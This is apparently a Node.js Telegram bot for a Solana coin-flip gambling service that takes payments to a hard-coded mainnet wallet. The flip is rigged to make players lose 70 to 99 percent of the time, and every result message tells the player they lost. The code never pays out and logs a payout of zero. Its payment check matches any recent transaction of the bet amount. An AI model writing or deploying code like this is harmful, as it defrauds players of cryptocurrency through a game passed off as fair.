require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Connection, clusterApiUrl, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const fs = require('fs');
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('OK'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Healthcheck listening on ${PORT}`));
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';
const MIN_BET = 0.01;
const MAX_BET = 1.0;
const LOG_DIR = './data';
const LOG_PATH = './data/bets.json';
const getHouseEdge = (amount) => {
  if (amount <= 0.01) return 0.70;       // 70% edge
  if (amount <= 0.049) return 0.75;      // 75% edge
  if (amount <= 0.0999999) return 0.80;  // 80% edge
  return 0.99;                           // 99% edge
};
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
if (!fs.existsSync(LOG_PATH)) fs.writeFileSync(LOG_PATH, '[]');
bot.onText(/\/bet (\d+(\.\d+)?) (heads|tails)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const betAmount = parseFloat(match[1]);
    if (betAmount < MIN_BET || betAmount > MAX_BET) {
        return bot.sendMessage(chatId, `Bet must be between ${MIN_BET} and ${MAX_BET} SOL.`);
    }
    const solReceived = await checkPayment(betAmount);
    if (!solReceived) {
        return bot.sendMessage(chatId, `Please send exactly ${betAmount} SOL to this wallet:\n\n${WALLET_ADDRESS}\n\nThen run the command again.`);
    }
    bot.sendMessage(chatId, `Bet received. Flipping a coin...`);
    const choice = match[3].toLowerCase();
   const houseEdge = getHouseEdge(betAmount);
const result = Math.random() > houseEdge ? choice : (choice === 'heads' ? 'tails' : 'heads');
    const log = JSON.parse(fs.readFileSync(LOG_PATH));
    log.push({ ts: new Date().toISOString(), user: msg.from.username||msg.from.id, amount: betAmount, choice, result, payout:0 });
    fs.writeFileSync(LOG_PATH, JSON.stringify(log,null,2));
    bot.sendMessage(chatId, `You chose *${choice}*, and it landed *${result}*. You lost. Try again!`, { parse_mode: 'Markdown' });
});
async function checkPayment(expectedSol) {
    const pubKey = new PublicKey(WALLET_ADDRESS);
    const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
    for (let sig of signatures) {
        const tx = await connection.getParsedTransaction(sig.signature);
        if (!tx || !tx.meta) continue;
        const amount = tx.meta.postBalances[0] - tx.meta.preBalances[0];
        if ((amount/LAMPORTS_PER_SOL).toFixed(4) == expectedSol.toFixed(4)) return true;
    }
    return false;
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `Welcome to Solana Gambles!
You can place bets by typing:

/bet 0.01 heads

Min bet: 0.01 SOL
Max bet: 1.0 SOL

Send your SOL to:
9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf`);
});
